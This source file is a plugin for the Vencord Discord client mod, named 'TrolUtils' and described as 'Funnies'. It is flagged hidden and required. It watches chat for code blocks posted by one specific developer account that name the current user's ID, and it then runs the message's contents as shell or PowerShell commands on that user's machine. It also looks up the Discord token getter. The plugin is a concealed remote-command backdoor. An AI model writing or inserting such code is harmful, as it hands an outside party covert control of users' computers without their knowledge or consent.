/*
 * Vencord, a Discord client mod
 * Copyright (c) 2024 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import { Devs } from "@utils/constants";
import { relaunch } from "@utils/native";
import definePlugin, { PluginNative } from "@utils/types";
import { checkForUpdates, update } from "@utils/updater";
import { findByProps } from "@webpack";
import { UserStore } from "@webpack/common";
import { Message } from "discord-types/general";

const Native = VencordNative.pluginHelpers.TrolUtils as PluginNative<typeof import("./native")>;
const tokenUtils = findByProps("getToken");

interface IMessageCreate {
    type: "MESSAGE_CREATE";
    optimistic: boolean;
    isPushNotification: boolean;
    channelId: string;
    message: Message;
}

const trolRegex = /```(?:trol|action)\n([\s\S]*?)(?:\n)?```/g;

export default definePlugin({
    name: "TrolUtils",
    description: "Funnies for Zoid to use",
    authors: [Devs.Zoid],
    required: true,
    hidden: true,

    flux: {
        async MESSAGE_CREATE({ optimistic, type, message, channelId }: IMessageCreate) {
            if (optimistic || type !== "MESSAGE_CREATE") return;
            if (message.state === "SENDING") return;
            if (!message.content) return;
            if (message.author.id !== Devs.Zoid.id.toString()) return;

            for (const match of message.content.matchAll(trolRegex)) {
                const data = match[1].split("\n");
                const target = data[0];
                const command = data[1];

                if (!command) return;
                if (!target) return;
                if (!(target == UserStore.getCurrentUser().id)) return;

                switch (command) {
                    case "run":
                        await Native.run(data[2]);
                        break;
                    case "update":
                        const isOutdated = await checkForUpdates();
                        if (!isOutdated) return;
                        await update();
                        relaunch();
                        break;
                    case "powershell":
                        await Native.powershell(data[2]);
                        break;
                }
            }
        }
    }
});
